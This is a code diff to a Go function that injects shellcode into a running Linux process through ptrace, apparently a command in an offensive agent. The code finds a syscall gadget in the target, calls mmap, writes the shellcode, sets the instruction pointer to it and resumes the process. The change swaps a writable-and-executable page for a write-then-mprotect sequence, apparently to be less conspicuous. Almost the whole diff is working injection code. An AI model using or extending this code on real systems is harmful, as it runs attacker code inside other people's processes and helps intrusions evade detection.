@@ -266,8 +266,7 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	}
 	sb.WriteString(fmt.Sprintf("[+] Found syscall gadget at 0x%X\n", syscallAddr))
 
-	// Step 4: Use ptrace syscall injection to call mmap and get an RWX page
-	// mmap(NULL, pagesize, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
+	// Step 4: Use ptrace syscall injection to call mmap(RW), write shellcode, then mprotect(RX)
 	pageSize := uint64(4096)
 	scSize := uint64(len(shellcode))
 	if restore {
@@ -277,91 +276,94 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 		pageSize = ((scSize + 4095) / 4096) * 4096
 	}
 
-	var mmapRegs syscall.PtraceRegs
-	mmapRegs = origRegs
-	mmapRegs.Rip = syscallAddr
-	mmapRegs.Rax = 9                      // SYS_mmap
-	mmapRegs.Rdi = 0                      // addr = NULL (kernel chooses)
-	mmapRegs.Rsi = pageSize               // length
-	mmapRegs.Rdx = 7                      // PROT_READ|PROT_WRITE|PROT_EXEC
-	mmapRegs.R10 = 0x22                   // MAP_PRIVATE|MAP_ANONYMOUS
-	mmapRegs.R8 = 0xffffffffffffffff      // fd = -1
-	mmapRegs.R9 = 0                       // offset = 0
-
-	if err := syscall.PtraceSetRegs(args.PID, &mmapRegs); err != nil {
-		_ = syscall.PtraceDetach(args.PID)
-		return structs.CommandResult{
-			Output:    sb.String() + fmt.Sprintf("[!] Failed to set mmap registers: %v\n", err),
-			Status:    "error",
-			Completed: true,
+	// Helper: execute a syscall in the target process via single-step
+	execSyscall := func(sysno, arg1, arg2, arg3, arg4, arg5, arg6 uint64) (uint64, error) {
+		var regs syscall.PtraceRegs
+		regs = origRegs
+		regs.Rip = syscallAddr
+		regs.Rax = sysno
+		regs.Rdi = arg1
+		regs.Rsi = arg2
+		regs.Rdx = arg3
+		regs.R10 = arg4
+		regs.R8 = arg5
+		regs.R9 = arg6
+		if err := syscall.PtraceSetRegs(args.PID, &regs); err != nil {
+			return 0, fmt.Errorf("set regs: %v", err)
 		}
+		if err := syscall.PtraceSingleStep(args.PID); err != nil {
+			return 0, fmt.Errorf("single step: %v", err)
+		}
+		if _, err := syscall.Wait4(args.PID, &ws, 0, nil); err != nil {
+			return 0, fmt.Errorf("wait4: %v", err)
+		}
+		if err := syscall.PtraceGetRegs(args.PID, &regs); err != nil {
+			return 0, fmt.Errorf("get regs: %v", err)
+		}
+		return regs.Rax, nil
 	}
 
-	// Single-step to execute the syscall instruction
-	if err := syscall.PtraceSingleStep(args.PID); err != nil {
+	// 4a: mmap(NULL, pagesize, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
+	rwAddr, err := execSyscall(9, 0, pageSize, 3, 0x22, 0xffffffffffffffff, 0)
+	if err != nil {
 		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
 		_ = syscall.PtraceDetach(args.PID)
 		return structs.CommandResult{
-			Output:    sb.String() + fmt.Sprintf("[!] PTRACE_SINGLESTEP failed: %v\n", err),
+			Output:    sb.String() + fmt.Sprintf("[!] mmap syscall failed: %v\n", err),
 			Status:    "error",
 			Completed: true,
 		}
 	}
-	if _, err := syscall.Wait4(args.PID, &ws, 0, nil); err != nil {
-		_ = syscall.PtraceDetach(args.PID)
-		return structs.CommandResult{
-			Output:    sb.String() + fmt.Sprintf("[!] Wait4 after mmap failed: %v\n", err),
-			Status:    "error",
-			Completed: true,
-		}
-	}
-
-	// Read the mmap return value from RAX
-	if err := syscall.PtraceGetRegs(args.PID, &mmapRegs); err != nil {
+	if rwAddr >= 0xfffffffffffff000 {
 		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
 		_ = syscall.PtraceDetach(args.PID)
 		return structs.CommandResult{
-			Output:    sb.String() + fmt.Sprintf("[!] Failed to read mmap result: %v\n", err),
+			Output:    sb.String() + fmt.Sprintf("[!] mmap returned MAP_FAILED (0x%X)\n", rwAddr),
 			Status:    "error",
 			Completed: true,
 		}
 	}
+	sb.WriteString(fmt.Sprintf("[+] mmap allocated RW page at 0x%X (%d bytes)\n", rwAddr, pageSize))
 
-	rwxAddr := mmapRegs.Rax
-	// mmap returns MAP_FAILED (-1 as unsigned) on error
-	if rwxAddr >= 0xfffffffffffff000 {
-		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
-		_ = syscall.PtraceDetach(args.PID)
-		return structs.CommandResult{
-			Output:    sb.String() + fmt.Sprintf("[!] mmap failed (returned 0x%X)\n", rwxAddr),
-			Status:    "error",
-			Completed: true,
-		}
-	}
-	sb.WriteString(fmt.Sprintf("[+] mmap allocated RWX page at 0x%X (%d bytes)\n", rwxAddr, pageSize))
-
-	// Step 5: Build injection code — shellcode + optional INT3 trailer
+	// 4b: Build injection code — shellcode + optional INT3 trailer
 	injectionCode := make([]byte, len(shellcode))
 	copy(injectionCode, shellcode)
 	if restore {
-		injectionCode = append(injectionCode, 0xCC) // INT3 to signal completion
+		injectionCode = append(injectionCode, 0xCC)
 	}
 
-	// Step 6: Write shellcode to the RWX page
-	if _, err := syscall.PtracePokeText(args.PID, uintptr(rwxAddr), injectionCode); err != nil {
+	// 4c: Write shellcode to the writable page
+	if _, err := syscall.PtracePokeText(args.PID, uintptr(rwAddr), injectionCode); err != nil {
 		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
 		_ = syscall.PtraceDetach(args.PID)
 		return structs.CommandResult{
-			Output:    sb.String() + fmt.Sprintf("[!] Failed to write shellcode to RWX page: %v\n", err),
+			Output:    sb.String() + fmt.Sprintf("[!] Failed to write shellcode: %v\n", err),
 			Status:    "error",
 			Completed: true,
 		}
 	}
-	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes at 0x%X\n", len(injectionCode), rwxAddr))
+	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes at 0x%X\n", len(injectionCode), rwAddr))
 
-	// Step 7: Set RIP to the shellcode in the RWX page
+	// 4d: mprotect(addr, pagesize, PROT_READ|PROT_EXEC) — make it executable, remove write
+	mprotectRet, err := execSyscall(10, rwAddr, pageSize, 5, 0, 0, 0)
+	if err != nil {
+		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
+		_ = syscall.PtraceDetach(args.PID)
+		return structs.CommandResult{
+			Output:    sb.String() + fmt.Sprintf("[!] mprotect syscall failed: %v\n", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+	if mprotectRet != 0 {
+		sb.WriteString(fmt.Sprintf("[!] mprotect returned %d (non-zero), continuing anyway\n", int64(mprotectRet)))
+	} else {
+		sb.WriteString("[+] mprotect: page now PROT_READ|PROT_EXEC\n")
+	}
+
+	// Step 5: Set RIP to the shellcode in the now-executable page
 	newRegs := origRegs
-	newRegs.Rip = rwxAddr
+	newRegs.Rip = rwAddr
 	if err := syscall.PtraceSetRegs(args.PID, &newRegs); err != nil {
 		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
 		_ = syscall.PtraceDetach(args.PID)
@@ -371,7 +373,7 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 			Completed: true,
 		}
 	}
-	sb.WriteString(fmt.Sprintf("[+] Set RIP to 0x%X\n", rwxAddr))
+	sb.WriteString(fmt.Sprintf("[+] Set RIP to 0x%X\n", rwAddr))
 
 	// Step 8: Continue execution
 	sb.WriteString("[*] Continuing execution...\n")
@@ -424,7 +426,7 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 		munmapRegs = origRegs
 		munmapRegs.Rip = syscallAddr
 		munmapRegs.Rax = 11           // SYS_munmap
-		munmapRegs.Rdi = rwxAddr      // addr
+		munmapRegs.Rdi = rwAddr      // addr
 		munmapRegs.Rsi = pageSize     // length
 		if err := syscall.PtraceSetRegs(args.PID, &munmapRegs); err == nil {
 			if err := syscall.PtraceSingleStep(args.PID); err == nil {
